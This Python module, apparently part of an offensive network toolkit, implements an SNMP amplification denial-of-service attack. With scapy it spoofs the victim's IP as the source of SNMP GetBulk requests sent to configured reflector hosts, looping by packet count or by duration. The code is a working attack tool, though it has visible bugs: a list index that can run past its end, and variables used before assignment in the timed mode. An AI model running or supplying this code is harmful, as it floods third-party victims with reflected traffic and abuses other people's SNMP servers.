from scapy.all import *

from lib.cmd_tool import *

NAME = 'SnmpAmplification'

class Module:
    def __init__(self):
        pass

    def interactive(self):
        interactive(self, 'snmp_amp')

    def run(self):
        def snmp_req(szTargetIP: str, szSnmpIP: str, nSnmpPort: int):
            pktIP = IP(src=szTargetIP, dst=szSnmpIP)
            pktUDP = UDP(sport=randInt(), dport=nSnmpPort)
            pktSNMP = SNMP(version=2, community='public', PDU=SNMPbulk(id=randInt(), non_repeaters=0, max_repetitions=10))

            pkt = pktIP / pktUDP / pktSNMP

            send(pkt)

        try:
            lsIP = str2strls(get_value(self.config, 'IP'))
            lsSnmpHost = str2strls(get_value(self.config, 'SnmpHosts'))
            nCnt = int(get_value(self.config, 'Count'))
            nTime = int(get_value(self.config, 'Time'))
            nMode = int(get_value(self.config, 'Mode'))

            total = 0

            for ip in lsIP:
                if nMode == MODE_COUNT:
                    snmpHost = lsSnmpHost[randint(0, len(lsSnmpHost))]
                    szSnmpIP, szSnmpPort = snmpHost.split(':')
                    nSnmpPort = int(szSnmpPort)

                    snmp_req(ip, szSnmpIP, nSnmpPort)

                    total += 1

                elif nMode == MODE_TIME:
                    param = {
                        'szTargetIP': ip,
                        'szSnmpIP': szSnmpIP,
                        'nSnmpPort': nSnmpPort,
                    }

                    total += doWorkWithSeconds(snmp_req, nTime, param)
            
            cp.pf_failed(f'Done, total={total}')

        except Exception as ex:
            cp.pf_failed(str(ex))